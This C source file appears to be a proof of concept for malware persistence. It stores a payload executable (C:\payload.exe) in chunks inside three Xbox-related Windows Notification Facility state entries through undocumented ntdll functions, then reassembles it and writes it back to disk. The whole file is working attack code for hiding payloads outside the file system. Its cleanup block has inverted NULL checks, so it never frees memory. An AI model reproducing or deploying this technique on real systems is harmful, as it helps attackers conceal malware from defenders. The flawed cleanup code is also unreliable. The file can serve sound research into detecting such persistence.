#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>

#include "FileHelpers.h"

typedef NTSTATUS(*ZwUpdateWnfStateDataFunc)(
	PDWORD64 StateId,
	LPVOID DataBuffer,
	int DataBufferSize,
	GUID TypeId,
	ULONG_PTR Scope,
	int MatchingChangestamp,
    bool CheckChangestamp
);

typedef NTSTATUS(*ZwQueryWnfStateDataFunc)(
	PDWORD64 StateId,
	GUID TypeId,
	ULONG_PTR Scope,
    PULONG Changestamp,
	LPVOID DataBuffer,
	PULONG DataBufferSize
);


#define CHUNK_SIZE		4096
#define NUM_WNF_STATES  3

int main()
{
	printf("Starting...\n");

	ZwUpdateWnfStateDataFunc ZwUpdateWnfStateDataAddr = NULL;
	ZwQueryWnfStateDataFunc ZwQueryWnfStateDataAddr = NULL;

	DWORD errorCode = 0;
	NTSTATUS status = ERROR_SUCCESS;
	
	//WNF_XBOX_PACKAGE_STREAMING_STATE, WNF_XBOX_PASS3_UPDATE_NOTIFICATION, WNF_XBOX_QUERY_UPDATE_NOTIFICATION
	DWORD64 STATE_IDS[] = { 0x19890c35a3bd7075, 0x19890c35a3bd1875, 0x19890c35a3bd8075 };

	LPVOID fileInMemBuf = NULL;
	LARGE_INTEGER fileSize = { 0 };

	LPVOID outbuf = NULL;
	ULONG outsize = 0;

	ULONG_PTR scope = 0;
	GUID guid = { 0 };
	ULONG changestamp = 0;

	LONGLONG numBytesLeft = 0;
	LONGLONG numBytesUsed = 0;
	
	//Open NtDll
	HMODULE hmodNtdll = LoadLibraryA("ntdll.dll");
	if (NULL == hmodNtdll)
	{
		printf("Couldn't get handle to ntdll\n");
		errorCode = 1;
		goto CLEANUP;
	}

	//Find ZwUpdateWnfStateData
	ZwUpdateWnfStateDataAddr = (ZwUpdateWnfStateDataFunc)GetProcAddress(hmodNtdll, "ZwUpdateWnfStateData");
	if (NULL == ZwUpdateWnfStateDataAddr)
	{
		printf("Couldn't find ZwUpdateWnfStateData\n");
		errorCode = 2;
		goto CLEANUP;
	}

	//Find ZwQueryWnfStateData
	ZwQueryWnfStateDataAddr = (ZwQueryWnfStateDataFunc)GetProcAddress(hmodNtdll, "ZwQueryWnfStateData");
	if (NULL == ZwQueryWnfStateDataAddr)
	{
		printf("Couldn't find ZwQueryWnfStateData\n");
		errorCode = 3;
		goto CLEANUP;
	}

	//Read payload into a buffer
	if (FALSE == readFileIntoBuffer("C:\\payload.exe", &fileInMemBuf, &fileSize))
	{
		printf("Failed to read file into buffer\n");
		errorCode = 4;
		goto CLEANUP;
	}

	//Ensure the payload size will fit in the number of WNF states we currently use
	numBytesLeft = fileSize.QuadPart;
	if (numBytesLeft > (CHUNK_SIZE * NUM_WNF_STATES))
	{
		printf("The file is too big to persist with %d WNF states\n", NUM_WNF_STATES);
		errorCode = 5;
		goto CLEANUP;
	}

	//Split up the payload into separate chunks and update the WNF states with the chunks of data
	for (int i = 0; i < NUM_WNF_STATES; i++)
	{
		int currentSize = (int)(numBytesLeft > CHUNK_SIZE ? CHUNK_SIZE : numBytesLeft);

		status = ZwUpdateWnfStateDataAddr(&STATE_IDS[i], ((BYTE*)fileInMemBuf) + numBytesUsed, currentSize, guid, scope, 0, false);
		if (0 != status)
		{
			printf("ZwUpdateWnfStateData (call number %d) failed with status %x\n", i+1, status);
			errorCode = 6;
			goto CLEANUP;
		}

		numBytesLeft -= currentSize;
		numBytesUsed += currentSize;
	}

	//Allocate a buffer big enough to hold the entire payload
	outbuf = HeapAlloc(GetProcessHeap(), 0, fileSize.QuadPart);
	if (NULL == outbuf)
	{
		printf("Failed to allocate memory for outbuf using HeapAlloc\n");
		errorCode = 7;
		goto CLEANUP;
	}


	//Rebuild the entire payload in a buffer by querying each WNF state for their respective data chunks
	numBytesUsed = 0;
	for (int i = 0; i < NUM_WNF_STATES; i++)
	{
		outsize = 0;

		//First call is to set 'outsize' so we know how much data to expect from this chunk
		status = ZwQueryWnfStateDataAddr(&STATE_IDS[i], guid, scope, &changestamp, ((BYTE*)outbuf) + numBytesUsed, &outsize);
		if (0xC0000023  == status) // STATUS_BUFFER_TOO_SMALL
		{
			status = ZwQueryWnfStateDataAddr(&STATE_IDS[i], guid, scope, &changestamp, ((BYTE*)outbuf) + numBytesUsed, &outsize);
		}

		if (0 != status)
		{
			printf("ZwQueryWnfStateData (call number %d) failed with status %x\n", i + 1, status);
			errorCode = 8;
			goto CLEANUP;
		}

		numBytesUsed += outsize;
	}

	//Write the payload to a file on disk to simulate "persistence"
	if (FALSE == writeBufferToFile(outbuf, numBytesUsed))
	{
		printf("Failed to write payload back to file\n");
		errorCode = 9;
		goto CLEANUP;
	}


CLEANUP:
	//Free fileInMemBuf memory
	if (NULL == fileInMemBuf)
	{
		HeapFree(GetProcessHeap(), 0, fileInMemBuf);
	}

	//Free outbuf memory
	if (NULL == outbuf)
	{
		HeapFree(GetProcessHeap(), 0, outbuf);
	}

	printf("Error code is %d\n", errorCode);
	return errorCode;
}